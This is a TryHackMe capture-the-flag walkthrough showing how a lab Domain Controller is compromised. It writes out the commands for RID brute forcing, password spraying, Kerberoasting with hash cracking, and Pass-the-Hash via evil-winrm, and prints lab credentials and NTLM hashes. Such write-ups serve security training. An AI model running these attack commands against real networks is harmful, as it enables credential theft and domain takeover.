# TryHackMe - Soupedecode 01 Walkthrough

![image.png](image.png)

## Introduction

Test your enumeration skills on this boot-to-root machine. Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.

## Port Enumeration

As always, the first step was port enumeration to identify exposed services:

```bash
nmap -sT -p- -vvv -T5 10.65.148.96
```

**Results**

```bash
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
3389/tcp  open  ms-wbt-server    syn-ack
9389/tcp  open  adws             syn-ack
49664/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49673/tcp open  unknown          syn-ack
49710/tcp open  unknown          syn-ack
```

The presence of Kerberos (88), LDAP, and SMB strongly indicates that this host is a **Domain Controller**. Based on this, I proceeded with domain enumeration.

## Domain Enumeration

Given that LDAP and SMB were exposed, I attempted enumeration using both protocols.

### SMB Enumeration

```bash
smbclient -L 10.65.148.96 -N
```

**Results**

![image.png](image%201.png)

The output revealed multiple shares, including **NETLOGON** and **SYSVOL**, confirming that this system is a Domain Controller.

However, attempts to list the contents of the shares resulted in *access denied* errors.

This suggested that anonymous access was partially enabled but restricted.

![image.png](image%202.png)

### LDAP Enumeration

```bash
ldapsearch -x -H ldap://10.65.148.96 -s base
```

- **Domain Name:** `SOUPEDECODE.LOCAL`
- **Hostname:** `DC01.SOUPEDECODE.LOCAL`
- **Naming Context:** `DC=SOUPEDECODE,DC=LOCAL`

Further LDAP enumeration was not possible, indicating that **anonymous LDAP bind is disabled**.

![image.png](image%203.png)

Since none of the attack vectors (using null sessions or anonymous)was working i opted for an automated tool - `enum4linux-ng`

### **Enum4linux-ng**

Since manual enumeration via null sessions and anonymous access was unsuccessful, I used an automated enumeration tool:

```bash
enum4linux-ng -A 10.65.148.96 -oA results.txt
```

A key finding from the output was:

```bash
sessions:
  sessions_possible: true
  'null': false
  password: false
  Kerberos: false
  NTLM: false
  guest: true
```

This confirms that:

- **Null sessions are disabled**
- The **Guest account is enabled** and accessible without a password

## RID Brute Forcing

Because the Guest account is allowed to authenticate over SMB, I used it to perform RID brute forcing:

```bash
crackmapexec smb 10.65.148.96 -u 'guest' -p '' --rid-brute
```

### Why this works (and why other methods didn’t)

- The Guest account is permitted to perform **limited SMB operations**
- RID brute forcing relies on SID enumeration, which does not require share listing permissions
- Listing shares or using LDAP/RPC requires higher privileges, which Guest does not have

As a result, I successfully obtained a list of **domain usernames**.

![image.png](image%204.png)

## **User Enumeration & Password Spraying**

I validated the usernames using **Kerbrute**, which confirmed **315 valid domain users**.

AS-REP roasting was attempted but returned no results, indicating that none of the users had `DONT_REQ_PREAUTH` enabled.

Since no password hints were provided and large wordlists would be noisy, I performed a **password spray using usernames as passwords**:

```bash
./kerbrute passwordspray -d SOUPEDECODE.LOCAL --dc 10.65.148.96 valid_users.txt --user-as-pass
```

![image.png](image%205.png)

This resulted in a valid credential:

```bash
ybob317@SOUPEDECODE.LOCAL:ybob317
```

## SMB Access with Valid Credentials

Using the newly discovered credentials, I enumerated the **Users** share:

```bash
smbclient //10.65.148.96/Users -U 'ybob317%ybob317'
```

**Results**

![image.png](image%206.png)

Navigating through the share I was able to retrieve the user flag

![image.png](image%207.png)

## Kerberoasting

Kerberoasting targets **service accounts** that have Service Principal Names (SPNs). These accounts can be requested Kerberos service tickets, which are encrypted using the service account’s NTLM hash and can be cracked offline.

I performed Kerberoasting using Impacket:

```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.65.148.96 -request -outputfile hashes.txt
```

![image.png](image%208.png)

The hash for the `file_svc` service account was extracted and cracked using Hashcat:

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Cracked Credential**

```bash
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$59e7617d0403a512c5f2e7b271940e7a$a179e60fcf7acfebea40e73f78dbae15dbf69705ada2ec741440887fa240131a0ba523aea58a163325cc82c5344a80315ba8faa24ed2df1ceafcf88fe8a0774caef3da8a2f4a332b7bea9df877442cd66c0004a7a9bbf31dae4f3eba8423e3bbce6d42fb46762f75fdf1fbbaeb6a7524430874c07a4741b4b628791d259ccea9d290d4cda6a933b9718f6fac30349e00465c979dd07f097247fddfea5df3168b981b77809e4c71dc6560087f2ca809c26f116b9fdb849da051c08b7a16df8a1d44abcc6f5c0b3cc6c730ddfb7adf06154564d7f85dc2710bd36fae161dd3b4097bef7266042cc73da26c770d8bd8658c22fb061461ba723b29bf1365c1afc11d3fc794248b4eef07541fdf7f7fdec5322101b6065ffb1ab9c383a574a31a9c166abc304844d2f0eaa46008992d58539c71e4f5058db28aba95945ccd41e7c886cb1ab180217107605c928f9de40faf3a1cebb2c383ba96a73ea9f333c89990033facd50480f038f7d1f3d911552a62d963ec7ec3686686facfa85a2ba97977c7d7a4196a52a6fdac8b940f3a042850c827920277440708e9d2afd88624d272a753bb689e1c0bf2cc04a6c445c52c148d83239a50cf86bac5c6cb0fd287f9da885981489352b7d66a68369c8bf1d13687ae41d174e34fbb434ffda3ce0b02ddca7230d33de348114c1beed17a085502a23064e6ee72165c20645a1385d1e4ba246d378e9505a4760b37449dded55f4e1c8daa1e04bca0d89c31219007f27548edf556a2f37c1ab484eba11baa82c18afe2c826e59e3e68b3622a2496af056cae138d2d7bd8b55d3f4a471c3eff5d78e5aaac07339dc9cfb734ac6b1d5a14fc6c1b0000e07dd7f715d7320a89198e712ad4387809a6c5046d72489a568ed3928f0515109f0686e86dfb850bf3f5c52e6d2ec9f785ba466d1abcf42651897de6c1eb9e440b340c42f20de109136f80c22453732e1dbca46c0a17a4b4a63b30df22bb54cd9273eb8afa1c5ec6de56ec9d969d137bce051d36e7bb40a80bdc481c28bf56a0c6732758a33a5644b3d94374cabf2a842003be27e60714ec8d820a8726c106882f7655399d62ecc79753ce77aa7cea6b68caa38095669ba855afb5bb78bf9cdc6973f83e20702072e5bca9a962312e0d407e8467071163f865f7e942521c61115c34d19ff4aa51d3f6fd6a84364306ce4a0229942301c2e9fd68317c79a92fedf2eb32ab017aceafb29978c5a11cacac734998c4ec1e8e45a342fdddb7ac9a0678e4b473153ba076d0162e588d71d3169054ac7ff536b72d450366ffe15889cf10df10162a89255b098ae9aabc805ab40fc68bdcc92f9a13e8625756c58f41bab58d3f74abb0b165acd19767af37e02111ab3e5ef9dc46adee9db9f3578c1762c6d8a1ea3f2cecfd4718d4b744a462ff4b3a5ee55fa34d5a0bf4d1cd60c5c19b7bc9fc16cdc6e19ec5bac66384be885a11a7839e18125736f6237bf802c04:Password123!!
```

The credentials were validated successfully:

```bash
crackmapexec smb 10.65.148.96 -u file_svc -p 'Password123!!'
```

![image.png](image%209.png)

## Lateral Movement & Credential Dump

Re-enumerating SMB shares using the `file_svc` account revealed a file named `backup_extract.txt`.

![image.png](image%2010.png)

This file contained **NTLM hashes for multiple computer accounts** within the domain:

```bash
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

Each entry included the corresponding RID and NTLM hash, making them suitable candidates for a **Pass-the-Hash** attack.

I extracted the computer account names and their hashes into separate files and tested them for valid authentication using Pass-the-Hash:

```bash
nxc smb 10.65.148.96 -u account_names.txt -H account_hashes.txt --continue-on-success
```

This resulted in a successful authentication using the following account:

![image.png](image%2011.png)

Since the `FileServer$` computer account is a **local administrator** on the Domain Controller, I used Pass-the-Hash to establish a session via Evil-WinRM:

```bash
evil-winrm -i 10.65.148.96 -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'
```

This granted administrative access, allowing me to retrieve the **root.txt** flag and fully compromise the system

![image.png](image%2012.png)